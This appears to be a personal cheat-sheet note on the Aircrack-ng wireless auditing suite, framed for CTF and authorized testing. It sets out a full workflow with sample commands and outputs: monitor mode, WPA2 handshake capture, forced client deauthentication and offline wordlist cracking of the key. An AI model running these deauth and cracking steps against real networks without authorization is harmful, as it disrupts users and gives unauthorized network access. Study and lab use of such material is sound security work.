#### Official Documentation: [https://www.aircrack-ng.org/](https://www.aircrack-ng.org/)
#### Cheat Sheet: [[Kali Tools#Aircrack-ng|Aircrack-ng Commands]]
## Purpose
Aircrack-ng is a suite for auditing wireless networks. It captures packets, analyzes WPA/WPA2 handshakes, and cracks WEP/WPA-PSK keys using offline dictionary or brute-force attacks.

## Scenarios
- CTF: Capture a WPA2 handshake from a target AP, then use a wordlist to try and recover the PSK that unlocks the network (flag).  
- Real world: Assess Wi-Fi security in a lab or authorized engagement by testing weak passphrases and misconfigured networks.

## All needed info to run
- Wireless adapter that supports monitor mode (check with `iwconfig` / `airmon-ng`).  
- Common tools in suite: `airmon-ng`, `airodump-ng`, `aireplay-ng`, `aircrack-ng`.  
- Typical workflow:
  1. `airmon-ng check kill` → stop interfering services.  
  2. `airmon-ng start <iface>` → enable monitor mode (creates `mon0` or `wlan0mon`).  
  3. `airodump-ng <mon_iface>` → scan and capture packets, find target BSSID/CH.  
  4. `airodump-ng --bssid <BSSID> -c <channel> -w <prefix> <mon_iface>` → capture handshake to .cap file.  
  5. (Optional) `aireplay-ng --deauth 10 -a <BSSID> -c <client> <mon_iface>` → deauth client to force re-auth and capture handshake.  
  6. `aircrack-ng -w <wordlist> -b <BSSID> <capture>.cap` → offline crack using wordlist.  
- File formats: capture files `.cap` / `.pcap`. Wordlists: `rockyou.txt` or custom.

## Example commands & outputs
```bash
# Kill interfering services, enable monitor mode
$ sudo airmon-ng check kill
$ sudo airmon-ng start wlan0
# Output:
# (mon0) created by airmon-ng

# Scan for APs and clients and start capture
$ sudo airodump-ng mon0
# Shows list of BSSIDs, channels, ESSIDs, clients

# Capture only target BSSID on channel 6 and write to capture file
$ sudo airodump-ng --bssid 00:11:22:33:44:55 -c 6 -w capture mon0
# Output shows packets being saved to capture-01.cap

# Optional: deauth a client to force handshake
$ sudo aireplay-ng --deauth 10 -a 00:11:22:33:44:55 -c 66:77:88:99:AA:BB mon0
# Output: 10 deauth packets sent

# Crack with wordlist
$ sudo aircrack-ng -w /usr/share/wordlists/rockyou.txt -b 00:11:22:33:44:55 capture-01.cap
# Output snippet:
# Opening capture-01.cap
# Reading packets, PTK handshake found
# Key found: password123
```

!!! note "Aircrack-ng Basics"
	- You need a wireless adapter that supports monitor mode and injection; check compatibility before testing.
	- `airmon-ng check kill` stops NetworkManager/ wpa_supplicant which can interfere; re-enable them after testing.
	- Capturing a handshake may require deauthing a client with `aireplay-ng` if no new auth occurs.
	- Cracking depends on wordlist quality; large wordlists take time — GPU tools (hashcat) can speed up PSK cracking if you extract the PMK correctly.


### [[Kali Tools#Aircrack-ng|Aircrack-ng Commands]]